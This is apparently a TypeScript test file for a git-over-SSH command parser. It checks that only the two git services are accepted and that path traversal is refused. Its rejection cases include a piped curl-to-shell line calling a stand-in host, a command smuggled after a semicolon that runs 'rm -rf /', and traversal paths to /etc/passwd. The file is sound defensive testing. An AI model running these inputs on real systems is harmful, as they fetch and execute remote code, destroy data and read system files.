// What a client is allowed to ask for over SSH.
//
// This is the parser on the far side of an authenticated connection: somebody
// with a valid key sends this string, and it decides which repository on disk
// it means. Two things it must never do, and both are here as tests rather than
// as intentions - run anything that is not one of the two git services, and
// resolve a path that leaves the repository root.
//
// The end-to-end test runs the real clients against the real daemon. This one
// covers the shapes that are awkward to produce there: the quoting variants
// that different git versions emit, and the inputs somebody would try on
// purpose.

import { describe, expect, test } from 'bun:test'
import { parseGitCommand } from '../../app/Actions/Git/ssh'

function accepted(command: string) {
  const parsed = parseGitCommand(command)
  if (!parsed.ok)
    throw new Error(`expected accepted, got: ${parsed.message}`)

  return parsed
}

describe('parseGitCommand', () => {
  test.each([
    ['git-upload-pack \'/owner/name.git\'', 'upload-pack'],
    ['git-receive-pack \'/owner/name.git\'', 'receive-pack'],
    ['git-upload-pack "/owner/name.git"', 'upload-pack'],
    ['git-upload-pack /owner/name.git', 'upload-pack'],
    ['git-upload-pack /owner/name', 'upload-pack'],
    ['git-upload-pack \'~owner/name.git\'', 'upload-pack'],
    ['git upload-pack \'/owner/name.git\'', 'upload-pack'],
    ['git receive-pack owner/name', 'receive-pack'],
  ])('reads %s', (command, service) => {
    // Every one of these is a shape some git version actually sends. The `~`
    // form comes from `git@host:~owner/name.git`, which people still write.
    const parsed = accepted(command)

    expect(parsed.service).toBe(service as 'upload-pack' | 'receive-pack')
    expect(parsed.owner).toBe('owner')
    expect(parsed.name).toBe('name')
  })

  test('an empty command is a shell request, and says so', () => {
    const parsed = parseGitCommand('')

    expect(parsed.ok).toBe(false)
    expect(parsed.ok === false && parsed.message).toContain('shell access')
  })

  test.each([
    'whoami',
    'sh -c "curl evil.example | sh"',
    'git-upload-archive /owner/name.git',
    'git status',
    '/usr/bin/git-upload-pack /owner/name.git; rm -rf /',
  ])('refuses %s', (command) => {
    // Not a shell: no substitution, no globbing, and no command that is not one
    // of the two services. Anything else would turn "may push to one
    // repository" into "may run anything on the server".
    expect(parseGitCommand(command).ok).toBe(false)
  })

  test.each([
    'git-upload-pack \'/../../etc/passwd\'',
    'git-upload-pack \'/owner/../../../etc\'',
    'git-upload-pack \'/owner/..\'',
    'git-upload-pack \'//\'',
    'git-upload-pack \'/owner\'',
    'git-upload-pack \'/owner/name/extra\'',
    'git-upload-pack \'/owner/na me\'',
  ])('refuses the path in %s', (command) => {
    // Through the same resolver every other entry point uses, so a traversal is
    // refused here rather than handed to git.
    expect(parseGitCommand(command).ok).toBe(false)
  })

  test('does not expand anything', () => {
    // `$HOME` is five characters and `*` is one. A parser that let a shell near
    // this would be a parser that runs whatever the client wrote.
    expect(parseGitCommand('git-upload-pack \'/$HOME/name.git\'').ok).toBe(false)
    expect(parseGitCommand('git-upload-pack \'/owner/*\'').ok).toBe(false)
  })

  test('keeps a backslash-escaped space inside a name, and then refuses it', () => {
    // The quoting rules match a shell's so that a legitimately quoted path
    // parses; the *name* rules are stricter than a shell's, so a name a shell
    // would accept is still refused. Both halves matter, and this is the case
    // where they meet.
    expect(parseGitCommand('git-upload-pack /owner/na\\ me.git').ok).toBe(false)
  })

  test('takes the last argument as the repository', () => {
    // git passes the path last. Options before it, if a client sends any, are
    // not repositories.
    expect(accepted('git-upload-pack --strict \'/owner/name.git\'').name).toBe('name')
  })
})
